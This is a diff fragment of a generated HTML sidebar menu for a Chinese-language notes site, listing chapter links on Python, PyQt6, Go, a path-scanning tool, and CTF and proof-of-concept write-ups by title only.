+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.19" data-path="../../../05.语言知识/02.Python/01.Python基础编程/19.Python-字典(Dictonary">
+            
+                <span>
+            
+                    
+                    19.Python-字典(Dictonary)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.20" data-path="../../../05.语言知识/02.Python/01.Python基础编程/20.Python-日期和时间.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/20.Python-日期和时间.html">
+            
+                    
+                    20.Python-日期和时间
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.21" data-path="../../../05.语言知识/02.Python/01.Python基础编程/21.Python-函数.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/21.Python-函数.html">
+            
+                    
+                    21.Python-函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.22" data-path="../../../05.语言知识/02.Python/01.Python基础编程/22.Python-模块.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/22.Python-模块.html">
+            
+                    
+                    22.Python-模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.23" data-path="../../../05.语言知识/02.Python/01.Python基础编程/23.Python-文件IO.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/23.Python-文件IO.html">
+            
+                    
+                    23.Python-文件IO
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.24" data-path="../../../05.语言知识/02.Python/01.Python基础编程/24.Python-File方法.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/24.Python-File方法.html">
+            
+                    
+                    24.Python-File方法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.25" data-path="../../../05.语言知识/02.Python/01.Python基础编程/25.Python-异常处理.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/25.Python-异常处理.html">
+            
+                    
+                    25.Python-异常处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.26" data-path="../../../05.语言知识/02.Python/01.Python基础编程/26.Python-OS-文件目录方法.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/26.Python-OS-文件目录方法.html">
+            
+                    
+                    26.Python-OS-文件目录方法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.1.27" data-path="../../../05.语言知识/02.Python/01.Python基础编程/27.Python-内置函数.html">
+            
+                <a href="../../../05.语言知识/02.Python/01.Python基础编程/27.Python-内置函数.html">
+            
+                    
+                    27.Python-内置函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2" data-path="../../../05.语言知识/02.Python/02.Python高级编程/">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/">
+            
+                    
+                    02.Python高级编程
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.2.1" data-path="../../../05.语言知识/02.Python/02.Python高级编程/01.Python-面向对象.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/01.Python-面向对象.html">
+            
+                    
+                    01.Python-面向对象
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.2" data-path="../../../05.语言知识/02.Python/02.Python高级编程/02.Python-正则表达式.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/02.Python-正则表达式.html">
+            
+                    
+                    02.Python-正则表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.3" data-path="../../../05.语言知识/02.Python/02.Python高级编程/03.Python-CGI编程.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/03.Python-CGI编程.html">
+            
+                    
+                    03.Python-CGI编程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.4" data-path="../../../05.语言知识/02.Python/02.Python高级编程/04.Python-MySQL.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/04.Python-MySQL.html">
+            
+                    
+                    04.Python-MySQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.5" data-path="../../../05.语言知识/02.Python/02.Python高级编程/05.Python-网络编程.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/05.Python-网络编程.html">
+            
+                    
+                    05.Python-网络编程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.6" data-path="../../../05.语言知识/02.Python/02.Python高级编程/06.Python-SMTP.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/06.Python-SMTP.html">
+            
+                    
+                    06.Python-SMTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.7" data-path="../../../05.语言知识/02.Python/02.Python高级编程/07.Python-多线程.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/07.Python-多线程.html">
+            
+                    
+                    07.Python-多线程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.8" data-path="../../../05.语言知识/02.Python/02.Python高级编程/08.Python-XML解析.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/08.Python-XML解析.html">
+            
+                    
+                    08.Python-XML解析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.9" data-path="../../../05.语言知识/02.Python/02.Python高级编程/09.Python-JSON解析.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/09.Python-JSON解析.html">
+            
+                    
+                    09.Python-JSON解析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.10" data-path="../../../05.语言知识/02.Python/02.Python高级编程/10.Python-GUI编程(PyQt">
+            
+                <span>
+            
+                    
+                    10.Python-GUI编程(PyQt)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.11" data-path="../../../05.语言知识/02.Python/02.Python高级编程/11.Python-2.x-3.x版本区别.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/11.Python-2.x-3.x版本区别.html">
+            
+                    
+                    11.Python-2.x-3.x版本区别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.2.12" data-path="../../../05.语言知识/02.Python/02.Python高级编程/12.Python-IDE.html">
+            
+                <a href="../../../05.语言知识/02.Python/02.Python高级编程/12.Python-IDE.html">
+            
+                    
+                    12.Python-IDE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3" >
+            
+                <span>
+            
+                    
+                    03.Python模块学习
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.1" >
+            
+                <span>
+            
+                    
+                    01.Python-GUI编程
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/">
+            
+                    
+                    01.Python-PyQt6
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.1" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/01.开始.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/01.开始.html">
+            
+                    
+                    01.开始
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.2" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/02.PyQt-简介.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/02.PyQt-简介.html">
+            
+                    
+                    02.PyQt-简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.3" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/03.PyQt6-日期和时间.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/03.PyQt6-日期和时间.html">
+            
+                    
+                    03.PyQt6-日期和时间
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.4" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/04.PyQt6-第一个程序.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/04.PyQt6-第一个程序.html">
+            
+                    
+                    04.PyQt6-第一个程序
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.5" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/05.PyQt6-菜单和工具栏.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/05.PyQt6-菜单和工具栏.html">
+            
+                    
+                    05.PyQt6-菜单和工具栏
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.6" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/06.PyQt6-布局管理.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/06.PyQt6-布局管理.html">
+            
+                    
+                    06.PyQt6-布局管理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.7" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/07.PyQt6-事件与信号.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/07.PyQt6-事件与信号.html">
+            
+                    
+                    07.PyQt6-事件与信号
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.8" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/08.PyQt6-对话框.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/08.PyQt6-对话框.html">
+            
+                    
+                    08.PyQt6-对话框
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.9" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/09.PyQt6-组件一.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/09.PyQt6-组件一.html">
+            
+                    
+                    09.PyQt6-组件一
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.10" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/10.PyQt6-组件二.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/10.PyQt6-组件二.html">
+            
+                    
+                    10.PyQt6-组件二
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.11" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/11.PyQt6-拖拽操作.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/11.PyQt6-拖拽操作.html">
+            
+                    
+                    11.PyQt6-拖拽操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.12" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/12.PyQt6-绘制.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/12.PyQt6-绘制.html">
+            
+                    
+                    12.PyQt6-绘制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.13" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/13..PyQt6-自定义部件.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/13..PyQt6-自定义部件.html">
+            
+                    
+                    13..PyQt6-自定义部件
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.1.1.14" data-path="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/14.例子.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/01.Python-GUI编程/01.Python-PyQt6/14.例子.html">
+            
+                    
+                    14.例子
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.2" >
+            
+                <span>
+            
+                    
+                    02.Python-爬虫
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.2.1" data-path="../../../05.语言知识/02.Python/03.Python模块学习/02.Python-爬虫/01.Python-Beautiful-Soup4.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/02.Python-爬虫/01.Python-Beautiful-Soup4.html">
+            
+                    
+                    01.Python-Beautiful-Soup4
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.2.2" data-path="../../../05.语言知识/02.Python/03.Python模块学习/02.Python-爬虫/02.Python-bs4-应用篇.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/02.Python-爬虫/02.Python-bs4-应用篇.html">
+            
+                    
+                    02.Python-bs4-应用篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.3" >
+            
+                <span>
+            
+                    
+                    03.Python-http请求库
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.3.1" data-path="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/01.Python-Requests/">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/01.Python-Requests/">
+            
+                    
+                    01.Python-Requests
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.3.1.1" data-path="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/01.Python-Requests/01.Python-requests库-学习笔记.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/01.Python-Requests/01.Python-requests库-学习笔记.html">
+            
+                    
+                    01.Python-requests库-学习笔记
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.3.2" data-path="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/02.Python-hack-requests/">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/02.Python-hack-requests/">
+            
+                    
+                    02.Python-hack-requests
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.1.3.3.3" data-path="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/03.Python-aiohttp/">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/03.Python-aiohttp/">
+            
+                    
+                    03.Python-aiohttp
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1.3.3.3.1" data-path="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/03.Python-aiohttp/01.Python-aiohttp.html">
+            
+                <a href="../../../05.语言知识/02.Python/03.Python模块学习/03.Python-http请求库/03.Python-aiohttp/01.Python-aiohttp.html">
+            
+                    
+                    01.Python-aiohttp
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" >
+            
+                <span>
+            
+                    
+                    03.Go
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.2.1" data-path="../../../05.语言知识/03.Go/01.Go基础编程/">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/">
+            
+                    
+                    01.Go基础编程
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.2.1.1" data-path="../../../05.语言知识/03.Go/01.Go基础编程/01.GoLang-开发环境配置.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/01.GoLang-开发环境配置.html">
+            
+                    
+                    01.GoLang-开发环境配置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.2" data-path="../../../05.语言知识/03.Go/01.Go基础编程/02.GoLang-变量常量.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/02.GoLang-变量常量.html">
+            
+                    
+                    02.GoLang-变量常量
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.3" data-path="../../../05.语言知识/03.Go/01.Go基础编程/03.GoLang-数据类型.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/03.GoLang-数据类型.html">
+            
+                    
+                    03.GoLang-数据类型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.4" data-path="../../../05.语言知识/03.Go/01.Go基础编程/04.GoLang-运算符.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/04.GoLang-运算符.html">
+            
+                    
+                    04.GoLang-运算符
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.5" data-path="../../../05.语言知识/03.Go/01.Go基础编程/05.GoLang-流程控制.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/05.GoLang-流程控制.html">
+            
+                    
+                    05.GoLang-流程控制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.6" data-path="../../../05.语言知识/03.Go/01.Go基础编程/06.GoLang-数组.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/06.GoLang-数组.html">
+            
+                    
+                    06.GoLang-数组
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.7" data-path="../../../05.语言知识/03.Go/01.Go基础编程/07.GoLang-切片.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/07.GoLang-切片.html">
+            
+                    
+                    07.GoLang-切片
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.8" data-path="../../../05.语言知识/03.Go/01.Go基础编程/08.GoLang-指针.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/08.GoLang-指针.html">
+            
+                    
+                    08.GoLang-指针
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.9" data-path="../../../05.语言知识/03.Go/01.Go基础编程/09.GoLang-map.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/09.GoLang-map.html">
+            
+                    
+                    09.GoLang-map
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.10" data-path="../../../05.语言知识/03.Go/01.Go基础编程/10.GoLang-函数.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/10.GoLang-函数.html">
+            
+                    
+                    10.GoLang-函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.11" data-path="../../../05.语言知识/03.Go/01.Go基础编程/11.GoLang-文件io.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/11.GoLang-文件io.html">
+            
+                    
+                    11.GoLang-文件io
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.12" data-path="../../../05.语言知识/03.Go/01.Go基础编程/12.Golang-操作MySQL.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/12.Golang-操作MySQL.html">
+            
+                    
+                    12.Golang-操作MySQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.13" data-path="../../../05.语言知识/03.Go/01.Go基础编程/13.GoLang-操作Redis.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/13.GoLang-操作Redis.html">
+            
+                    
+                    13.GoLang-操作Redis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.14" data-path="../../../05.语言知识/03.Go/01.Go基础编程/14.GoLang-结构体.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/14.GoLang-结构体.html">
+            
+                    
+                    14.GoLang-结构体
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.15" data-path="../../../05.语言知识/03.Go/01.Go基础编程/15.GoLang-包.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/15.GoLang-包.html">
+            
+                    
+                    15.GoLang-包
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.16" data-path="../../../05.语言知识/03.Go/01.Go基础编程/16.GoLang-接口.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/16.GoLang-接口.html">
+            
+                    
+                    16.GoLang-接口
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.17" data-path="../../../05.语言知识/03.Go/01.Go基础编程/17.GoLang-反射.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/17.GoLang-反射.html">
+            
+                    
+                    17.GoLang-反射
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.18" data-path="../../../05.语言知识/03.Go/01.Go基础编程/18.GoLang-并发.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/18.GoLang-并发.html">
+            
+                    
+                    18.GoLang-并发
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.1.19" data-path="../../../05.语言知识/03.Go/01.Go基础编程/19.GoLang-网络编程.html">
+            
+                <a href="../../../05.语言知识/03.Go/01.Go基础编程/19.GoLang-网络编程.html">
+            
+                    
+                    19.GoLang-网络编程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.2" >
+            
+                <span>
+            
+                    
+                    02.Go模块学习
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.2.2.1" data-path="../../../05.语言知识/03.Go/02.Go模块学习/01.GoLang-fmt.html">
+            
+                <a href="../../../05.语言知识/03.Go/02.Go模块学习/01.GoLang-fmt.html">
+            
+                    
+                    01.GoLang-fmt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.2.2" data-path="../../../05.语言知识/03.Go/02.Go模块学习/02.GoLand-net.http.html">
+            
+                <a href="../../../05.语言知识/03.Go/02.Go模块学习/02.GoLand-net.http.html">
+            
+                    
+                    02.GoLand-net.http
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.2.3" data-path="../../../05.语言知识/03.Go/02.Go模块学习/03.GoLang-goflags.html">
+            
+                <a href="../../../05.语言知识/03.Go/02.Go模块学习/03.GoLang-goflags.html">
+            
+                    
+                    03.GoLang-goflags
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.3" >
+            
+                <span>
+            
+                    
+                    03.Go代码案例
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.2.3.1" >
+            
+                <span>
+            
+                    
+                    01.GoLang-编写POC
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.2.3.1.1" data-path="../../../05.语言知识/03.Go/03.Go代码案例/01.GoLang-编写POC/01.GoLang-CVE-2022-26134.html">
+            
+                <a href="../../../05.语言知识/03.Go/03.Go代码案例/01.GoLang-编写POC/01.GoLang-CVE-2022-26134.html">
+            
+                    
+                    01.GoLang-CVE-2022-26134
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.3.1.2" data-path="../../../05.语言知识/03.Go/03.Go代码案例/01.GoLang-编写POC/02.GoLang-Docker-Daemon-Api-Rce.html">
+            
+                <a href="../../../05.语言知识/03.Go/03.Go代码案例/01.GoLang-编写POC/02.GoLang-Docker-Daemon-Api-Rce.html">
+            
+                    
+                    02.GoLang-Docker-Daemon-Api-Rce
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2.3.2" data-path="../../../05.语言知识/03.Go/03.Go代码案例/02.GoLang-简易http代理.html">
+            
+                <a href="../../../05.语言知识/03.Go/03.Go代码案例/02.GoLang-简易http代理.html">
+            
+                    
+                    02.GoLang-简易http代理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" >
+            
+                <span>
+            
+                    
+                    06.pathScan-doc
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../../../06.pathScan-doc/01.下载安装.html">
+            
+                <a href="../../../06.pathScan-doc/01.下载安装.html">
+            
+                    
+                    01.下载安装
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../../../06.pathScan-doc/02.初始化.html">
+            
+                <a href="../../../06.pathScan-doc/02.初始化.html">
+            
+                    
+                    02.初始化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../../../06.pathScan-doc/03.命令参数.html">
+            
+                <a href="../../../06.pathScan-doc/03.命令参数.html">
+            
+                    
+                    03.命令参数
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../../../06.pathScan-doc/04.扫描模式.html">
+            
+                <a href="../../../06.pathScan-doc/04.扫描模式.html">
+            
+                    
+                    04.扫描模式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" >
+            
+                <span>
+            
+                    
+                    07.CTF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.7.1" >
+            
+                <span>
+            
+                    
+                    01.Knownsec
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.7.1.1" data-path="../../../07.CTF/01.Knownsec/01.knownsec-ctf-09/">
+            
+                <a href="../../../07.CTF/01.Knownsec/01.knownsec-ctf-09/">
+            
+                    
+                    01.knownsec-ctf-09
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7.2" >
+            
+                <span>
+            
+                    
+                    02.奇技淫巧
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.7.2.1" data-path="../../../07.CTF/02.奇技淫巧/01.PHP利用GNU%20C Iconv将文件读取变成RCE（CVE-2024-2961）.md">
+            
+                <span>
+            
+                    
+                    01.PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7.2.2" data-path="../../../07.CTF/02.奇技淫巧/02.利用shell脚本变量构造无字母数字命令.html">
+            
+                <a href="../../../07.CTF/02.奇技淫巧/02.利用shell脚本变量构造无字母数字命令.html">
+            
+                    
+                    02.利用shell脚本变量构造无字母数字命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7.2.3" data-path="../../../07.CTF/02.奇技淫巧/03.FILTERS的任意格式输出.html">
+            
+                <a href="../../../07.CTF/02.奇技淫巧/03.FILTERS的任意格式输出.html">
+            
+                    
+                    03.FILTERS的任意格式输出
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
